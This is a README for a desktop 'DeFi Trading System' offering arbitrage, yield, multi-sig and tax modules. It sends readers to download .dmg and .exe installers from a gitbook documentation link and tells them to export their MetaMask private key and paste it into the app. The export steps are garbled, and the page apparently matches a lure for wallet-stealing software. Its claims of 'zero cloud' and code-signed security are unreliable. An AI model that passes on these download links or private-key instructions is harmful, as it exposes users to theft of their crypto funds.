DeFi Trading System, a modular, plugin-based desktop application (macOS & Windows) that consolidates institutional-grade DeFi tools—arbitrage, MEV protection, yield farming, RWA tokenization, multi‑sig vaults, offline signing, risk analytics, and compliance—into one secure, high-performance local interface.

## 🔑 Key Features & Modules
Each capability is a plugin adhering to a common Strategy interface—hot-swap modules without restarting the core engine.

- 🔄 Arbitrage & MEV Scanner: Real-time cross-chain DEX/CEX spreads + Flashbots bundles
- 🌾 Yield Farming & LP: APY vs. impermanent loss modeling, auto-compound flows
- 🛡️ Multi-Sig Vault Manager: Configurable co-signer vaults with encrypted logs
- 🔒 Secure Transaction Hub: Offline signing workflows via USB/NFC/QR, hardware wallet integration
- 📊 Analytics & Risk: Monte Carlo VaR, stress tests, PnL dashboard, FIFO/LIFO accounting|
- 🏛️ RWA & Governance: Tokenized real-world assets, DAO proposal feeds, offline vote prep
- ⚡️ Local Node Connectivity: Geth/Nethermind (light/full) for sub-100ms RPC and no rate limits
- 📝 Tax & Compliance: Jurisdiction-specific exports (Form 8949, EU XML), audit-ready logs

## 📥 Installation & Setup
### macOS
1. Download the .dmg from [Releases](https://selenium-finance.gitbook.io/defi-algo-trading-bot-documentation/download/macos).
2. Open and drag DeFi Trading System to /Applications.
3. Approve notarization prompt.

### Windows

1. Download the .exe installer from [Releases](https://selenium-finance.gitbook.io/defi-algo-trading-bot-documentation/download/windows).
2. Run installer, enable sandboxed updates.
3. Finish setup wizard.

## ⚙️ Configuration & Customization

All module parameters live under Settings → Modules. Defaults are optimized for institutional workflows.

- Scan Frequency: 10–60 sec
- Profit/APY Thresholds: Customizable per strategy
- Slippage & Gas Caps: Set tolerance levels
- Accounting Methods: FIFO, LIFO, custom tags
- VaR Confidence & Horizon: 90–99%, 1–30 days
- Tax Jurisdiction: US‑IRS, EU, UK‑HMRC, custom

Settings are stored in an AES‑256 encrypted YAML file at ~/.guardianvault/config.yaml.

## 🔗 Wallet Connection Guide(MetaMask for exampale)
MetaMask Private Key
- Export key: MetaMask ▶️ Account ▶️ Import Account ▶️ Private Key
- In app: Settings ▶️ Add Wallet ▶️ Private Key
> 🚨 Always clear clipboard after pasting private keys.

## 👩‍💻 Usage Examples
```
# Optional: start local node
geth --syncmode light &

# Launch with custom RPC endpoint
defitradingsystem --rpc http://localhost:8545
```
1. Add Wallets: Paste addresses or scan WalletConnect.
2. Run Arbitrage Scan: Open Scanner, set thresholds, click Start.
3. Manage Yields: Browse pools, compare APYs, click Deploy.
4. Sign Offline: Generate TX, scan QR on Ledger/Trezor, then broadcast.

## 🔒 Security & Privacy
- Data Sovereignty: All data stays on-device in encrypted SQLite.
- Zero Cloud: No backend; eliminates XSS/CSRF and remote breaches.
- Hardware Wallets & Offline Signing: USB/NFC/QR workflows.
- Code-Signed Updates: Ensures integrity and sandbox compliance.
- Audit Trails: Every action cryptographically timestamped.

